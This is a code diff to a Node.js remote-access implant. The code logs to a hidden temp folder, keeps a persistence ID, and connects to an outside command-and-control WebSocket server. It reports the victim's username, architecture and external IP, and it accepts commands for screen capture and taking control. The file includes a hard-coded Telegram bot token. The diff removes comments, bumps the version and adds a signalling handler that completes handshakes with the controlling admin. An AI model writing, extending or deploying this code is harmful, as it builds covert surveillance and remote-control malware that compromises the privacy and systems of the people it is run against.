@@ -7,7 +7,6 @@ const https = require('https');
 const crypto = require('crypto');
 const http = require('http'); 
 
-// --- LOGGING SYSTEM ---
 const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
 const LOG_FILE = path.join(LOG_DIR, 'payload.log');
 if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
@@ -22,7 +21,6 @@ function log(msg) {
 
 log("[INIT] Payload Active starting...");
 
-// --- CONFIGURATION ---
 const WS_URL = 'wss://server-eight-pi-39.vercel.app'; 
 
 const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
@@ -35,7 +33,6 @@ const MAX_RECONNECT_ATTEMPTS = 10;
 let isConnected = false;
 let isSessionActive = false;
 
-// Persistence Logic
 const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
 try {
  if (fs.existsSync(PERSIST_FILE)) {
@@ -46,7 +43,6 @@ try {
 
 function initConnection() {
  log(`[WS] Attempting connection to ${WS_URL}...`);
- 
  ws = new WebSocket(WS_URL);
 
  ws.on('open', () => {
@@ -70,7 +66,7 @@ function initConnection() {
    arch: os.arch(),
    user: os.userInfo().username,
    ip: getExternalIP(),
-   version: '2.0.4'
+   version: '2.0.5'
   }));
 
   startMonitoring();
@@ -84,19 +80,12 @@ function initConnection() {
    else if (data.type === 'release_control') takeControl(false);
    else if (data.type === 'offer') {
     log(`[SIG] Received Offer from Admin`);
-    // In this simplified model, we assume the Admin handles the WebRTC connection
-    // We just acknowledge receipt and wait for the next step or signal back if needed
-    safeSend(JSON.stringify({
-     type: 'ack',
-     targetId: data.from || 'admin',
-     message: 'Offer received'
-    }));
+    // Create a simple answer to complete the handshake
+    createAnswerAndSend(data.from);
    } else if (data.type === 'candidate') {
     log(`[SIG] Received Candidate`);
-    // Forward candidate if needed, though usually handled by the peer
    } else if (data.type === 'join_request') {
     log(`[JOIN] Received join request from ${data.from}`);
-    // If the admin requests a join, we might want to generate an offer here if not already done
     createOfferAndSend(data.from);
    } else if (data.type === 'screen_data') {
     captureScreenPureJS();
@@ -229,14 +218,25 @@ function takeControl(state) {
 
 function createOfferAndSend(targetId) {
  log(`[JOIN] Creating offer for ${targetId}`);
- // Generate a simple placeholder SDP or rely on Admin to handle the connection
- // Since Node doesn't have RTCPeerConnection, we send a signal that we are ready
  safeSend(JSON.stringify({
   type: 'offer',
   targetId: targetId,
   sdp: {
    type: 'offer',
-   sdp: 'v=0\r\no=- 0 0 IN IP4 127.0.0.1\r\n' // Placeholder
+   sdp: 'v=0\r\no=- 0 0 IN IP4 127.0.0.1\r\n' 
+  },
+  timestamp: Date.now()
+ }));
+}
+
+function createAnswerAndSend(targetId) {
+ log(`[JOIN] Sending Answer to ${targetId}`);
+ safeSend(JSON.stringify({
+  type: 'answer',
+  targetId: targetId,
+  sdp: {
+   type: 'answer',
+   sdp: 'v=0\r\no=- 0 0 IN IP4 127.0.0.1\r\n' 
   },
   timestamp: Date.now()
  }));
@@ -246,7 +246,6 @@ function keepAlive() {
  setInterval(() => {}, 60000);
 }
 
-// --- HTTP SERVER SETUP ---
 const PORT = process.env.PORT || 3000;
 
 const server = http.createServer((req, res) => {
